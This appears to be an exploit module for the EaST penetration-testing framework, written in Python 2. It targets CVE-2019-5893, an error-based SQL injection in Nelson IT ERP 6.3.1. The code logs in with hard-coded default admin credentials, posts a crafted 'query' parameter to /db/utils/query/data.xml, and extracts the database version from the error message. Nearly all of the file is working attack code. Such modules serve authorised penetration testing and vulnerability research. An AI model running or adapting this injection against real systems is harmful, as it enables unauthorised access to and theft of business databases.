from Sploit import Sploit
from collections import OrderedDict
import urllib
import urllib2
import cookielib

INFO = {}
INFO['NAME'] = "ag_nelsonit_erp_6_3_1_esql"
INFO['DESCRIPTION'] = "Nelson IT ERP 6.3.1 error-based SQL injection"
INFO['VENDOR'] = "http://www.nelson-it.ch"
INFO['CVE Name'] = "CVE-2019-5893"
INFO['NOTES'] = """The flaw lies within POST request to /db/utils/query/data.xml.
An authenticated user may inject arbitrary SQL code into a post parameter 'query', resulting in data compromise.
Authentication is required.
Tested on Windows 7 x64.
"""
INFO['DOWNLOAD_LINK'] = "http://sourceforge.net/projects/opensourceerp/files/Windows/erp_6.3.1.exe/download"
INFO['LINKS'] = ["https://www.exploit-db.com/exploits/46118"]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/General"
INFO['AUTHOR'] = """Original exploit: 10 Jan 2019, Emre OVUNC
                    EaST Framework module: 14 Jan 2019, Gleg Team"""

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.57"
OPTIONS["PORT"] = 8024
OPTIONS["BASEPATH"] = '/'
OPTIONS["SSL"] = False
OPTIONS["LOGIN"] = 'admindb'
OPTIONS["PASSWORD"] = 'NtiAdmindb'

class NoRedirect(urllib2.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, hdrs, newurl):
        pass

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 8024
        self.protocol = 'http'
        self.login = 'admindb'
        self.password = 'NtiAdmindb'
        self.basepath = '/'

        # returns database version
        self.sqli = 'sqlend=1&query=%27%7c%7ccast((select+chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7c(SELECT+VERSION())%7c%7cchr(95)%7c%7cchr(33)%7c%7cchr(64))+as+numeric)%7c%7c%27&schema=mne_application&table=userpref&cols=startweblet%2cregion%2cmslanguage%2cusername%2cloginname%2cpersonid%2clanguage%2cregionselect%2ctimezone%2ccountrycarcode%2cstylename%2cusername%2cstartwebletname&usernameInput.old=session_user&mneuserloginname=test'

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.login = self.args.get("LOGIN", self.login)
        self.password = self.args.get("PASSWORD", self.password)
        self.protocol = 'https' if self.args.get("SSL", False) else 'http'
        self.basepath = self.args.get("BASEPATH", self.basepath)
        if self.basepath == '/':
            self.basepath = ''
        else:
            self.basepath = '/' + self.basepath.strip('/')

        urllib2.install_opener(
            urllib2.build_opener(
                NoRedirect(),
                urllib2.HTTPCookieProcessor(
                    cookielib.LWPCookieJar()
                )
            )
        )

    def authorize(self):
        url = '{}://{}:{}{}/'.format(self.protocol, self.host, self.port, self.basepath)
        data = {
            'location':'{}%3A%2F%2F{}%3A{}%2F'.format(self.protocol, self.host, self.port),
            'mneuserloginname':'{}'.format(self.login),
            'mneuserpasswd':'{}'.format(self.password)
        }
        data = urllib.urlencode(data)
        req = urllib2.Request(url, data)
        try:
            urllib2.urlopen(req)
        except urllib2.HTTPError as ex:
            if ex.code == 301:
                pass

    def inject(self):
        url = '{}://{}:{}{}/db/utils/query/data.xml'.format(self.protocol, self.host, self.port, self.basepath)
        data = 'sqlend=1&query='
        data += self.sqli
        data += '&schema=mne_application&table=userpref'
        data += '&cols=startweblet%2cregion%2cmslanguage%2cusername%2cloginname%2cpersonid%2clanguage%2cregionselect%2ctimezone%2ccountrycarcode%2cstylename%2cusername%2cstartwebletname&usernameInput.old=session_user&mneuserloginname=test'
        req = urllib2.Request(url, data)
        r = urllib2.urlopen(req).read()
        return r

    def process_response(self, response):
        start = response.find('<v class="error">') + 17
        end = response.find('</v>')
        return response[start:end]


    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        self.log('[*] Authorizing as {}...'.format(self.login))
        self.authorize()
        self.log('[*] Sending payload...')
        result = self.process_response(self.inject())
        self.log('[+] Done. Check the line below')
        self.log(result)

        self.finish(True) # If True - module succeeded, if False - module failed


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()